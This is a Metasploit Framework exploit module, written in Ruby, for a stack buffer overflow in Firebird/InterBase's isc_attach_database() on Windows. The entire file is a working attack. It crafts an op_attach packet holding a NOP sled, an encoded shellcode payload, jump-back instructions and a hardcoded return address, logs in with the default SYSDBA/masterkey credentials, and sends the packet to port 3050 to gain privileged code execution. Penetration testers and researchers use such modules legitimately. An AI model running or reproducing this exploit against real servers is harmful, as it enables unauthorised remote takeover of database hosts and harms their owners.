##
# $Id: fb_isc_attach_database.rb 5136 2007-10-04 03:03:13Z ramon $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Misc::Fb_Isc_Attach_Database < Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	include Exploit::Remote::BruteTargets

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Firebird Relational Database isc_attach_database() Buffer Overflow',
			'Description'	=> %q{
				This module exploits a stack overflow in Borland InterBase
				by sending a specially crafted create request.
			},
			'Version'	=> '$Revision: 5136 $',
			'Author'	=>
				[
					'Ramon de Carvalho Valle <ramon@risesecurity.org>',
					'Adriano Lima <adriano@risesecurity.org>',
				],
			'Arch'		=> ARCH_X86,
			'Platform'	=> 'win',
			'References'	=>
				[
					[ 'URL', 'http://risesecurity.org/advisory/RISE-2007003/' ],
				],
			'Privileged'	=> true,
			'License'	=> MSF_LICENSE,
			'Payload'	=>
				{
					'Space' => 512,
					'BadChars' => "\x00\x2f\x3a\x40\x5c",
					'StackAdjustment' => -3500,
				},
			'Targets'	=>
				[
					[ 'Brute Force', { } ],
					# '\Device\HarddiskVolume1\WINDOWS\system32\unicode.nls'
					[
						'Firebird WI-V2.0.0.12748 WI-V2.0.1.12855 (unicode.nls)',
						{ 'Length' => [ 756 ], 'Ret' => 0x00370b0b }
					],
					# Debug
					[
						'Debug',
						{ 'Length' => [ 756 ], 'Ret' => 0xaabbccdd }
					],
				],
			'DefaultTarget'	=> 1
		))

		register_options(
			[
				Opt::RPORT(3050)
			],
			self.class
		)

	end



	# Create database parameter block
	def dpb_create
		isc_dpb_user_name = 28
		isc_dpb_password = 29

		isc_dpb_version1 = 1

		user = 'SYSDBA'
		pass = 'masterkey'

		dpb = ''

		dpb << [isc_dpb_version1].pack('c')

		dpb << [isc_dpb_user_name].pack('c')
		dpb << [user.length].pack('c')
		dpb << user

		dpb << [isc_dpb_password].pack('c')
		dpb << [pass.length].pack('c')
		dpb << pass

		dpb
	end

	# Calculate buffer padding
	def buf_padding(length = '')
		remainder = length.remainder(4)
		padding = 0

		if remainder > 0
			padding = (4 - remainder)
		end

		padding
	end

	def exploit_target(target)

		target['Length'].each do |length|

			connect

			# Attach database
			op_attach = 19

			# Extra padding to trigger the exception
			extra_padding = 1024 * 16

			buf = ''

			# Operation/packet type
			buf << [op_attach].pack('N')

			# Id
			buf << [0].pack('N')

			# Length
			buf << [length + extra_padding].pack('N')

			# Nop block
			buf << make_nops(length - payload.encoded.length - 13)

			# Payload
			buf << payload.encoded

			# Jump back into the nop block
			buf << "\xe9" + [-516].pack('V')

			# Jump back
			buf << "\xeb" + [-7].pack('c')

			# Random alpha data
			buf << rand_text_alpha(2)

			# Target
			buf << [target.ret].pack('V')

			# Random alpha data
			buf << rand_text_alpha(extra_padding)

			# Padding
			buf << "\x00" * buf_padding(length + extra_padding)

			# Database parameter block

			# Create database parameter block
			dpb = dpb_create

			# Database parameter block length
			buf << [dpb.length].pack('N')

			# Database parameter block
			buf << dpb

			# Padding
			buf << "\x00" * buf_padding(dpb.length)

			sock.put(buf)

			sleep(4)

			handler

		end

	end

end

end
